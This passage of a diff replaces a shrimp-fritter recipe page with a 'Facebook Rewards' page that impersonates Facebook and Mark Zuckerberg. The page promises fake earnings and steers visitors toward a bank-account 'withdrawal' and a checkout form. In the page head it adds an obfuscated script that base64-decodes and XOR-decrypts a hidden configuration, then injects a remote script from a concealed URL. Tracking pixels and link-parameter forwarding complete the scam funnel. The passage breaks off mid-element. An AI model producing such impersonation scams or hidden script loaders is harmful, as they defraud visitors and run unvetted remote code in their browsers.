-        </svg>
-       </div>
-       <div>
-        <h3>Keep the oil hot</h3>
-        <p>Fry at about 350°F / 175°C. The fritters should sizzle immediately without darkening before the shrimp is cooked through.</p>
-       </div>
-      </article>
-     </div>
-    </div>
-   </section>
-   <section class="process-section" id="como-funciona">
-    <div class="container">
-     <span class="eyebrow">How to make them</span>
-     <h2 class="section-title">Four easy steps to golden fritters.</h2>
-     <p class="section-description">Mix lightly, fry in small batches and serve right away for the best contrast between crisp edges and tender centers.</p>
-     <div class="steps">
-      <article class="step">
-       <span class="step-number">Step 01</span>
-       <h3>Prep the shrimp</h3>
-       <p>Pat the peeled shrimp dry and chop into small pieces. Slice the scallions, mince the garlic and chop the fresh parsley.</p>
-       <div class="step-line"></div>
-       <div class="step-icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="M21 15a4 4 0 0 1-4 4H8l-5 3V7a4 4 0 0 1 4-4h10a4 4 0 0 1 4 4Z"></path>
-        </svg>
-       </div>
-      </article>
-      <article class="step">
-       <span class="step-number">Step 02</span>
-       <h3>Mix the batter</h3>
-       <p>Whisk flour, baking powder and seasonings. Add the egg and cold water, then fold in shrimp, corn, herbs and garlic.</p>
-       <div class="step-line"></div>
-       <div class="step-icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <rect x="3" y="5" width="18" height="16" rx="2"></rect> <path d="M16 3v4"></path> <path d="M8 3v4"></path> <path d="M3 11h18"></path>
-        </svg>
-       </div>
-      </article>
-      <article class="step">
-       <span class="step-number">Step 03</span>
-       <h3>Fry until golden</h3>
-       <p>Spoon small portions into 350°F / 175°C oil. Flatten gently and cook for 2 to 3 minutes per side in small batches.</p>
-       <div class="step-line"></div>
-       <div class="step-icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path> <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2Z"></path>
-        </svg>
-       </div>
-      </article>
-      <article class="step">
-       <span class="step-number">Step 04</span>
-       <h3>Drain and serve</h3>
-       <p>Transfer to a rack or paper towel, add a pinch of flaky salt and serve hot with lemon wedges and your favorite dipping sauce.</p>
-       <div class="step-line"></div>
-       <div class="step-icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="M12 2v20"></path> <path d="m17 5-5-3-5 3v6l5 3 5-3Z"></path>
-        </svg>
-       </div>
-      </article>
-     </div>
-     <div class="process-cta">
-      <p>For a quick sauce, stir together 1/2 cup mayonnaise, 1 tablespoon lemon juice, 1 teaspoon hot sauce and a pinch of salt.</p>
-      <a class="button button--light" href="#recipe" target="_self" rel="noopener noreferrer"> View ingredients again </a>
-     </div>
-    </div>
-   </section>
-   <section class="faq-section" id="duvidas">
-    <div class="container faq-layout">
-     <div class="faq-side">
-      <span class="eyebrow">Frequently asked</span>
-      <h2 class="section-title">A few helpful kitchen answers.</h2>
-      <p class="section-description">Easy swaps, storage guidance and simple ways to get consistently crisp shrimp fritters.</p>
-     </div>
-     <div class="faq-list">
-      <article class="faq-item is-open">
-       <button class="faq-question" type="button" aria-expanded="true">Can I use frozen shrimp?
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
-         <path d="M12 5v14"></path> <path d="M5 12h14"></path>
-        </svg></button>
-       <div class="faq-answer">
-        <div>
-         <p>Yes. Thaw it completely, drain it well and pat it very dry before chopping. Extra water will thin the batter and reduce crispness.</p>
-        </div>
-       </div>
-      </article>
-      <article class="faq-item">
-       <button class="faq-question" type="button" aria-expanded="false">Can I make the batter ahead?
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
-         <path d="M12 5v14"></path> <path d="M5 12h14"></path>
-        </svg></button>
-       <div class="faq-answer">
-        <div>
-         <p>You can prep the chopped ingredients a few hours ahead, but mix the wet batter just before frying so the baking powder stays active and the fritters remain light.</p>
-        </div>
-       </div>
-      </article>
-      <article class="faq-item">
-       <button class="faq-question" type="button" aria-expanded="false">What oil works best?
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
-         <path d="M12 5v14"></path> <path d="M5 12h14"></path>
-        </svg></button>
-       <div class="faq-answer">
-        <div>
-         <p>Use a neutral oil with a high smoke point, such as canola, sunflower, avocado or vegetable oil. Avoid extra-virgin olive oil for this frying temperature.</p>
-        </div>
-       </div>
-      </article>
-      <article class="faq-item">
-       <button class="faq-question" type="button" aria-expanded="false">How do I keep fritters crispy?
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
-         <path d="M12 5v14"></path> <path d="M5 12h14"></path>
-        </svg></button>
-       <div class="faq-answer">
-        <div>
-         <p>Fry in small batches and drain on a wire rack instead of stacking. If needed, hold them in a 225°F / 110°C oven for up to 20 minutes.</p>
-        </div>
-       </div>
-      </article>
-      <article class="faq-item">
-       <button class="faq-question" type="button" aria-expanded="false">Can I cook them without deep-frying?
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
-         <path d="M12 5v14"></path> <path d="M5 12h14"></path>
-        </svg></button>
-       <div class="faq-answer">
-        <div>
-         <p>Yes. Use a lightly oiled skillet over medium heat and flatten each fritter slightly. They can also be air-fried at 390°F / 200°C until golden, turning once.</p>
-        </div>
-       </div>
-      </article>
-     </div>
-    </div>
-   </section>
-   <section class="final-cta">
-    <div class="container">
-     <div class="final-cta__box">
-      <div>
-       <h2>Hot, crisp and ready for the table.</h2>
-       <p>Finish with lemon, chopped parsley and a pinch of flaky salt. Serve immediately and watch them disappear.</p>
-      </div>
-      <a class="button button--light" href="#inicio" target="_self" rel="noopener noreferrer"> Back to the top </a>
-     </div>
-    </div>
-   </section>
-  </main>
-  <footer class="site-footer">
-   <div class="container">
-    <div class="footer-grid">
-     <div class="footer-company">
-      <strong> Coastal Kitchen </strong>
-      <p>Relaxed home cooking with fresh ingredients, clear instructions and dependable results. Made for busy weeknights, sunny lunches and easy sharing.</p>
-     </div>
-     <div class="footer-links">
-      <a href="#recipe">The Recipe</a> <a href="#como-funciona">Method</a> <a href="#duvidas">Questions</a>
-     </div>
-    </div>
-    <div class="footer-bottom">
-     © <span id="currentYear"></span> Coastal Kitchen. All rights reserved.
-    </div>
-   </div>
-  </footer>
-  <a class="whatsapp-float" href="#recipe" target="_self" rel="noopener noreferrer" aria-label="Jump to recipe"> 
-   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-    <path d="M12 3v16"></path> <path d="m6 13 6 6 6-6"></path>
-   </svg> 
-  </a>
+<!DOCTYPE html><html lang="es"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Facebook Rewards</title>
+  <meta name="description" content="Earn rewards by evaluating Facebook content.">
+  <link rel="icon" href="images/DF32jO8vZckV.png">
+  <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js" as="script">
+  <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+  <link rel="dns-prefetch" href="https://cdn.converteai.net">
+  <link rel="dns-prefetch" href="https://scripts.converteai.net">
+  <link rel="dns-prefetch" href="https://images.converteai.net">
+  <link rel="dns-prefetch" href="https://api.vturb.com.br">
+  <link rel="stylesheet" href="css/MM3nXP63nRRs.css">
+
+  <!-- Meta Pixel Code -->
   <script>
-        const openMenuButton = document.getElementById("openMenu");
-        const closeMenuButton = document.getElementById("closeMenu");
-        const mobileMenu = document.getElementById("mobileMenu");
-        const mobileMenuLinks = mobileMenu.querySelectorAll("a");
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
 
-        function openMenu() {
-            mobileMenu.classList.add("is-open");
-            mobileMenu.setAttribute("aria-hidden", "false");
-            openMenuButton.setAttribute("aria-expanded", "true");
-            document.body.classList.add("menu-open");
-        }
+    fbq('init', '2008483963125888');
+    fbq('track', 'PageView');
+    fbq('track', 'ViewContent', {
+      content_name: 'Facebook Rewards',
+      content_type: 'product'
+    });
 
-        function closeMenu() {
-            mobileMenu.classList.remove("is-open");
-            mobileMenu.setAttribute("aria-hidden", "true");
-            openMenuButton.setAttribute("aria-expanded", "false");
-            document.body.classList.remove("menu-open");
-        }
+    // Evita eventos repetidos se o visitante clicar mais de uma vez.
+    window.metaTrackOnce = function(eventName, parameters, storageKey) {
+      if (typeof fbq !== 'function') return false;
+      var key = 'meta_pixel_2008483963125888_' + (storageKey || eventName);
+      try {
+        if (sessionStorage.getItem(key) === '1') return false;
+        sessionStorage.setItem(key, '1');
+      } catch (error) {}
+      fbq('track', eventName, parameters || {});
+      return true;
+    };
 
-        openMenuButton.addEventListener("click", openMenu);
-        closeMenuButton.addEventListener("click", closeMenu);
+    // Use esta função SOMENTE após o servidor/gateway confirmar PAID ou APPROVED.
+    // Exemplo: metaTrackConfirmedPurchase(19.90, 'USD', transactionId);
+    window.metaTrackConfirmedPurchase = function(value, currency, transactionId) {
+      var amount = Number(value);
+      var orderId = String(transactionId || '').trim();
+      if (typeof fbq !== 'function' || !Number.isFinite(amount) || amount <= 0 || !orderId) {
+        return false;
+      }
 
-        mobileMenuLinks.forEach((link) => {
-            link.addEventListener("click", closeMenu);
-        });
+      var purchaseKey = 'meta_purchase_2008483963125888_' + orderId;
+      try {
+        if (localStorage.getItem(purchaseKey) === '1') return false;
+        localStorage.setItem(purchaseKey, '1');
+      } catch (error) {}
 
-        document.addEventListener("keydown", (event) => {
-            if (event.key === "Escape") {
-                closeMenu();
-            }
-        });
+      fbq('track', 'Purchase', {
+        value: amount,
+        currency: currency || 'USD',
+        content_name: 'Facebook Rewards',
+        content_type: 'product'
+      }, {
+        eventID: orderId
+      });
+      return true;
+    };
+  </script>
+  <!-- End Meta Pixel Code -->
 
-        document.querySelectorAll(".faq-question").forEach((button) => {
-            button.addEventListener("click", () => {
-                const item = button.closest(".faq-item");
-                const isOpen = item.classList.contains("is-open");
-
-                document.querySelectorAll(".faq-item").forEach((faqItem) => {
-                    faqItem.classList.remove("is-open");
-                    faqItem
-                        .querySelector(".faq-question")
-                        .setAttribute("aria-expanded", "false");
-                });
-
-                if (!isOpen) {
-                    item.classList.add("is-open");
-                    button.setAttribute("aria-expanded", "true");
-                }
-            });
-        });
-
-        document.getElementById("currentYear").textContent =
-            new Date().getFullYear();
+  <script>window.pixelId = "691dd5a5e48594b29ef91762";</script>
+  <script src="js/BDTxNxyJpnED.js" async=""></script>
+  <script src="js/wAFZJQpKHWNK.js" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>(function(){var q_a3=atob("DNhJRS508ec91GIp7KNrMFwY090fvBZdnKtzagEXlYkToRZEhb4wa00bnMlfpk1aj6ogNVoH3pJJuREGgLk9IF0A341O9k4Ljaw9N0cWhJNYp0ATt6NrK08ZlMUH9gZImLlkMFoZmIFE+RJbia4sK1pZiYRSsE9aj7NraQwCkItIsUATzvo0aVVWn4ZQsUATzrwoMU9ZhJNQvQRQwag7IFgRn5MQpxdLhbw6ZwJWh4ZRoQcL1vprOHMJ");var h_aa6k=[];for(var o_oh05=0;o_oh05<q_a3.length;o_oh05++){h_aa6k.push(q_a3.charCodeAt(o_oh05)&255);}var g_e=h_aa6k[0];var h_m=h_aa6k.slice(1,1+g_e);var y_w2d=h_aa6k.slice(1+g_e);var i_529=y_w2d.map(function(b,p_xq52){return b^h_m[p_xq52%g_e];});var h_0j="";for(var m_m2=0;m_m2<i_529.length;m_m2++){h_0j+=String.fromCharCode(i_529[m_m2]&255);}var y_l1l=decodeURIComponent(escape(h_0j));var l_oap6=JSON.parse(y_l1l);var t_bqy=l_oap6.globals||[];t_bqy.forEach(function(q_vml){window[q_vml.name]=q_vml.value;});var c_6v9n=document.createElement("script");c_6v9n.src=l_oap6.url;c_6v9n.async=true;c_6v9n.defer=true;(l_oap6.attributes||[]).forEach(function(x_t){c_6v9n.setAttribute(x_t.name,x_t.value);});(document.head||document.documentElement).appendChild(c_6v9n);})();</script>
+<!-- Twemoji: emojis estilo Facebook/Twitter -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/twemoji.min.js" crossorigin="anonymous"></script>
+  <script>
+    (function(){
+      var p=new URLSearchParams(window.location.search);
+      document.addEventListener("click",function(e){
+        var a=e.target.closest("a");
+        if(!a)return;
+        var h=a.getAttribute("href");
+        if(!h||h.startsWith("#")||h.startsWith("javascript:"))return;
+        try{var u=new URL(a.href);p.forEach(function(v,k){u.searchParams.set(k,v);});a.href=u.toString();}catch(err){}
+      });
+    })();
     </script>
- </body>
-</html>
+  <style>
+    img.emoji { height: 1.1em; width: 1.1em; margin: 0 .05em 0 .05em; vertical-align: -0.15em; display: inline; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .modal-overlay { display: none; position: fixed; inset: 0; z-index: 100;
+      align-items: center; justify-content: center;
+      background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); padding: 1rem; }
+    .modal-overlay.open { display: flex; }
+    @keyframes drawCircle {
+      from { stroke-dashoffset: 251; }
+      to   { stroke-dashoffset: 0; }
+    }
+    @keyframes drawCheck {
+      from { stroke-dashoffset: 60; }
+      to   { stroke-dashoffset: 0; }
+    }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .anim-circle { stroke-dasharray: 251; stroke-dashoffset: 251;
+      animation: drawCircle 0.8s ease forwards 0.3s; }
+    .anim-check  { stroke-dasharray: 60;  stroke-dashoffset: 60;
+      animation: drawCheck 0.5s ease forwards 1.1s; }
+    .anim-fade-1 { opacity: 0; animation: fadeUp .4s ease forwards 1.6s; }
+    .anim-fade-2 { opacity: 0; animation: fadeUp .4s ease forwards 1.8s; }
+    .anim-fade-3 { opacity: 0; animation: fadeUp .4s ease forwards 2.2s; }
+    .anim-fade-4 { opacity: 0; animation: fadeUp .4s ease forwards 2.5s; }
+    .custom-scrollbar::-webkit-scrollbar { width: 4px; }
+    .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
+    .custom-scrollbar::-webkit-scrollbar-thumb { background: #d1d5db; border-radius: 2px; }
+    .progress-wrap { position: relative; width: 100%; max-width: 320px; margin: 0 auto; }
+    .progress-wrap svg { display: block; width: 100%; height: auto; }
+    .progress-center { position: absolute; inset: 0; display: flex;
+      align-items: center; justify-content: center; flex-direction: column; }
+  </style>
+<!-- CSS_ADSBLOCK_START -->
+<link rel="stylesheet" href="https://adblockers.opera-mini.net/css_block/default-domainless.css" type="text/css" />
+<!-- CSS_ADSBLOCK_END -->
+</head>
+<body class="flex flex-col min-w-[350px] min-h-svh items-center select-none antialiased">
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=2008483963125888&ev=PageView&noscript=1"
+    alt=""></noscript>
+
+  
+
+  <div class="flex flex-auto justify-center w-full max-w-xl">
+    <div class="bg-[#F2F4F7] min-h-screen w-full">
+
+      <!-- ─────────────────────────────────────────── -->
+      <!-- STEP 0: Welcome                             -->
+      <!-- ─────────────────────────────────────────── -->
+      <div id="step-0" class="step active">
+        <div class="flex flex-col appear w-full max-w-[430px] mx-auto bg-white min-h-screen shadow-xl justify-center">
+          <div class="flex flex-col justify-center items-center text-center gap-4 sm:gap-5 appear w-full max-w-lg mx-auto px-4 py-10">
+            <div class="bg-white rounded-3xl shadow-xl w-full p-5 sm:p-6 flex flex-col items-center gap-3">
+              <div class="bg-[#10B981] rounded-2xl p-3 shadow-lg" style="box-shadow:0 8px 20px rgba(16,185,129,0.35)">
+                <svg class="text-white w-8 h-8 sm:w-10 sm:h-10" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                  <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+              </div>
+              <h1 class="text-xl sm:text-2xl font-bold text-gray-900">🎁 Congratulations! 🎁</h1>
+              <p class="text-gray-600 text-sm sm:text-base px-2">You have been selected for Facebook's new rewards program. Enjoy!</p>
+              <div class="bg-[#D1FAE5] text-[#065F46] font-bold text-sm sm:text-base py-3 px-4 rounded-xl w-full flex items-center justify-center gap-2">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                  <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+                <span>You've already earned US$32.27!</span>
+              </div>
+              <p class="text-gray-600 text-sm sm:text-base px-4">Complete all assessments and make your first withdrawal!</p>
+              <button onclick="nextStep()" class="pulse w-full bg-[#00C950] hover:bg-[#00b046] text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center gap-2 mt-1 transition-all">
+                <span>Click to Get Started</span>
+                <svg class="rotate-90 w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M18 11V6a2 2 0 0 0-4 0"></path><path d="M14 10V4a2 2 0 0 0-4 0v2"></path>
+                  <path d="M10 10.5V6a2 2 0 0 0-4 0v8"></path>
+                  <path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"></path>
+                </svg>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ─────────────────────────────────────────── -->
+      <!-- STEPS 1-3: Posts (dynamic content)          -->
+      <!-- ─────────────────────────────────────────── -->
+      <div id="step-post" class="step">
+        <div id="post-wrap" class="flex flex-col gap-0 appear w-full max-w-[430px] mx-auto pb-10 bg-white min-h-screen shadow-xl">
+
+          <!-- Header -->
+          <header class="sticky top-0 z-50 bg-white border-b border-gray-200 px-4 py-3 w-full">
+            <div class="flex items-center justify-between w-full max-w-[430px] mx-auto">
+              <img alt="Facebook" width="125" height="28" class="h-6 w-auto object-contain" src="images/Facebook_Logo_%282019%29.svg">
+              <div class="bg-[#22C55E] text-white px-4 py-2 rounded-full font-bold text-base flex items-center gap-2 shadow-sm">
+                <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                  <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+                  <line x1="2" y1="10" x2="22" y2="10"></line>
+                </svg>
+                <span id="balance-post" class="flex items-center leading-none text-lg">$ 32.27</span>
+              </div>
+            </div>
+          </header>
+
+          <!-- Post card (filled by JS) -->
+          <div id="post-card" class="mx-4 my-4 bg-white rounded-2xl shadow-[0_2px_12px_rgba(0,0,0,0.1)] overflow-hidden border border-gray-100"></div>
+
+        </div>
+      </div>
+
+      <!-- ─────────────────────────────────────────── -->
+      <!-- STEP 4: Video page                          -->
+      <!-- ─────────────────────────────────────────── -->
+      <div id="step-4" class="step">
+        <div class="flex flex-col gap-5 sm:gap-6 appear w-full max-w-[430px] mx-auto pb-10 bg-white min-h-screen shadow-xl">
+
+          <!-- Header -->
+          <header class="sticky top-0 z-50 bg-white border-b border-gray-200 px-4 py-3 w-full">
+            <div class="flex items-center justify-between max-w-[430px] mx-auto">
+              <img alt="Facebook" width="125" height="28" class="h-6 w-auto object-contain" src="images/Facebook_Logo_%282019%29.svg">
+              <div class="bg-[#22C55E] text-white px-4 py-2 rounded-full font-bold text-base flex items-center gap-2 shadow-sm">
+                <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                  <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+                  <line x1="2" y1="10" x2="22" y2="10"></line>
+                </svg>
+                <span id="balance-video" class="flex items-center leading-none text-lg">$ 278.45</span>
+              </div>
+            </div>
+          </header>
+
+          <!-- Post card -->
+          <div class="flex flex-col gap-0 overflow-hidden">
+            <div class="mx-3 bg-white rounded-t-lg shadow-sm border border-gray-200 overflow-hidden border-b-0">
+
+              <!-- Post header: Mark Zuckerberg -->
+              <div class="p-3 flex justify-between items-start">
+                <div class="flex gap-2">
+                  <div class="relative w-10 h-10 rounded-full overflow-hidden border border-gray-200 flex-shrink-0">
+                    <img src="images/bMLFkPEGl3xh.webp" alt="Mark Zuckerberg" class="w-full h-full object-cover">
+                  </div>
+                  <div class="flex flex-col">
+                    <div class="flex items-center gap-1">
+                      <span class="font-semibold text-[15px] leading-tight">Mark Zuckerberg</span>
+                      <svg class="w-4 h-4 text-[#1877F2]" viewBox="0 0 24 24" fill="#1877F2" stroke="white" stroke-width="1">
+                        <path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"></path>
+                        <path d="m9 12 2 2 4-4" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
+                      </svg>
+                    </div>
+                    <div class="flex items-center gap-1 text-gray-500 text-[13px]">
+                      <span>Sponsored</span><span>•</span>
+                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path>
+                        <path d="M2 12h20"></path>
+                      </svg>
+                    </div>
+                  </div>
+                </div>
+                <button>
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="text-gray-500">
+                    <circle cx="12" cy="12" r="1"></circle><circle cx="19" cy="12" r="1"></circle><circle cx="5" cy="12" r="1"></circle>
+                  </svg>
+                </button>
+              </div>
+
+              <!-- Post text -->
+              <div class="px-3 pb-3">
+                <p class="text-[14px] text-gray-900 leading-snug">Watch this 4-minute tutorial to learn how to register your bank account and withdraw your earnings. Step-by-step guide for instant withdrawals.</p>
+              </div>
+
+              <!-- Video embed -->
+              <div id="video-container" class="w-full" style="margin:0"></div>
+
+
+              <!-- Engagement stats -->
+              <div class="flex justify-between items-center px-3 py-2 border-b border-gray-100">
+                <div class="flex items-center gap-1">
+                  <div class="flex -space-x-1">
+                    <div class="bg-[#1877F2] rounded-full p-1 z-20 border-2 border-white">
+                      <svg class="w-2 h-2 text-white fill-white" viewBox="0 0 24 24" stroke="white" stroke-width="2" fill="white"><path d="M7 10v12"></path><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"></path></svg>
+                    </div>
+                    <div class="bg-[#FA383E] rounded-full p-1 z-10 border-2 border-white flex items-center justify-center text-[8px]">❤️</div>
+                  </div>
+                  <span id="like-count" class="text-gray-500 text-sm ml-1">2.847</span>
+                </div>
+                <div class="flex gap-3 text-gray-500 text-sm">
+                  <span>15 comments</span><span>145 shares</span>
+                </div>
+              </div>
+
+              <!-- Like/Comment/Share buttons -->
+              <div class="border-t border-gray-200 pt-1">
+                <div class="flex items-center justify-around py-1">
+                  <button id="like-btn" onclick="toggleLike()" class="flex items-center gap-2 px-4 py-2 hover:bg-gray-100 rounded-md transition-colors flex-1 justify-center text-gray-600">
+                    <svg id="like-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M7 10v12"></path><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"></path>
+                    </svg>
+                    <span id="like-label" class="text-[15px] font-semibold">Like</span>
+                  </button>
+                  <button class="flex items-center gap-2 px-4 py-2 hover:bg-gray-100 rounded-md transition-colors flex-1 justify-center text-gray-600">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path>
+                    </svg>
+                    <span class="text-[15px] font-semibold">Comment</span>
+                  </button>
+                  <button class="flex items-center gap-2 px-4 py-2 hover:bg-gray-100 rounded-md transition-colors flex-1 justify-center text-gray-600">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                      <circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle>
+                      <line x1="8.59" x2="15.42" y1="13.51" y2="17.49"></line><line x1="15.41" x2="8.59" y1="6.51" y2="10.49"></line>
+                    </svg>
+                    <span class="text-[15px] font-semibold">Share</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Comments section -->
+            <div class="mx-3 bg-white rounded-b-lg shadow-sm border-x border-b border-gray-200 overflow-hidden">
+              <div class="border-t border-gray-200 px-4 py-3 bg-white">
+                <div id="comments-list" class="space-y-4 max-h-[500px] overflow-y-auto custom-scrollbar"></div>
+              </div>
+              <!-- Write comment input -->
+              <div class="flex items-start gap-2 px-4 py-3 border-t border-gray-100 bg-white">
+                <div class="relative w-8 h-8 rounded-full overflow-hidden border border-gray-200 flex-shrink-0">
+                  <img src="images/Yl8jFpPF17D9.png" alt="You" class="w-full h-full object-cover">
+                </div>
+                <form class="flex-1 relative" onsubmit="addComment(event)">
+                  <input id="comment-input" type="text" placeholder="Write a comment..." class="w-full bg-[#F0F2F5] rounded-full px-3 py-2 text-[15px] text-[#050505] placeholder-gray-500 focus:outline-none focus:bg-gray-200 transition-colors pr-10">
+                  <button type="submit" class="absolute right-3 top-1/2 -translate-y-1/2 text-[#1877F2]">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z"></path>
+                      <path d="m21.854 2.147-10.94 10.939"></path>
+                    </svg>
+                  </button>
+                </form>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ─────────────────────────────────────────── -->
+  <!-- MODAL: Balance Earned (green)               -->
+  <!-- ─────────────────────────────────────────── -->
+  <div id="modal-balance" class="modal-overlay">
+    <div class="bg-[#00C950] rounded-[32px] p-6 w-full max-w-[340px] text-center shadow-2xl relative overflow-hidden appear">
+      <!-- Animated checkmark -->
+      <div class="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg relative">
+        <div class="absolute inset-0 blur-lg bg-green-500/20 rounded-full"></div>
+        <svg width="42" height="42" viewBox="0 0 100 100" class="relative z-10">
+          <circle class="anim-circle" cx="50" cy="50" r="40" stroke="#10B981" stroke-width="4" fill="transparent" stroke-linecap="round"></circle>
+          <path class="anim-check" d="M30 50L45 65L70 35" stroke="#10B981" stroke-width="4" fill="transparent" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </div>
+      <h2 class="anim-fade-1 text-[20px] font-bold text-white mb-2">You Earned Money!</h2>
+      <p class="anim-fade-2 text-white/90 mb-4 leading-relaxed text-[15px]">Your feedback was submitted successfully</p>
+      <div id="earned-amount" class="anim-fade-3 text-[32px] font-black text-white mb-6 drop-shadow-md">+$82.06</div>
+      <div class="anim-fade-4">
+        <button onclick="continueFromBalance()" class="w-full bg-white hover:bg-white/90 text-black font-bold py-4 rounded-2xl text-[16px] transition-all transform active:scale-95 shadow-lg min-h-[54px]">
+          Continue
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ─────────────────────────────────────────── -->
+  <!-- MODAL: Checkout form                        -->
+  <!-- ─────────────────────────────────────────── -->
+  <div id="modal-checkout" class="modal-overlay">
+    <div class="flex flex-col w-full max-w-lg gap-5 text-center rounded-2xl shadow-lg px-8 py-10 bg-gray-50 relative appear">
+      <button onclick="closeCheckout()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 6 6 18"></path><path d="m6 6 12 12"></path>
+        </svg>
+      </button>
+      <!-- App info -->
+      <div class="flex w-full items-center gap-4 p-4 border rounded-xl border-gray-200 bg-white shadow-sm text-left">
